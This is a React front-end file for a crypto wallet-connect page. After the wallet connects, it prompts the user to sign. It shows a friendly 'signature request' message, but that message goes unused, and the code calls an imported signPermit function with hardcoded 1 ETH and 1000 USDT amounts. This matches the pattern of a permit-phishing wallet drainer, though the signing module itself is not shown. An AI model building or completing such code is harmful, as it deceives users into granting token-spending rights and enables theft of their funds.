import React, { useState } from 'react';
const { ethers } = window.ethers.default;
import WalletConnectButton from './WalletConnectButton.js';
import SignatureModal from './SignatureModal.js';
import signPermit from '@utils/signpermit.js'; // 导入 signPermit
import { getWeb3Provider } from '@utils/web3utils.js'; // 导入工具函数
import './App.css';

const App = () => {
  const [signer, setSigner] = useState(null);
  const [showSignatureModal, setShowSignatureModal] = useState(false);
  const [signature, setSignature] = useState(null);

  const connectWallet = async () => {
    try {
      const provider = await getWeb3Provider(); // 使用工具函数获取Web3提供者
      const signer = provider.getSigner();
      setSigner(signer);
      setShowSignatureModal(true);
      console.log('Wallet connected');
    } catch (error) {
      console.error('Failed to connect wallet:', error);
    }
  };

  const handleSign = async () => {
    const message = 'Hello, this is a signature request!';
    try {
      const ethAmount = ethers.utils.parseEther("1.0"); // 示例金额
      const usdtAmount = ethers.utils.parseUnits("1000", 6); // USDT 的示例金额（6 位小数）
      await signPermit(signer, ethAmount, usdtAmount); // 调用 signPermit 函数
      setShowSignatureModal(false);
    } catch (error) {
      console.error('Signing failed:', error);
    }
  };

  const submitSignatureToBlockchain = async (signature) => {
    try {
      // 提交签名到区块链的逻辑，例如调用智能合约的方法进行签名验证或授权
      console.log('Submitting signature to blockchain:', signature);
      // 示例：调用智能合约的方法进行签名验证或授权
      // const contract = new ethers.Contract(contractAddress, contractABI, signer);
      // await contract.permit(...);
    } catch (error) {
      console.error('Failed to submit signature to blockchain:', error);
    }
  };

  return (
    <div className="App">
      <div className="background-dollar"></div>
      {!signer && <WalletConnectButton onConnect={connectWallet} />}
      {showSignatureModal && (
        <SignatureModal
          onSign={handleSign}
          onClose={() => setShowSignatureModal(false)}
        />
      )}
    </div>
  );
};

export default App;
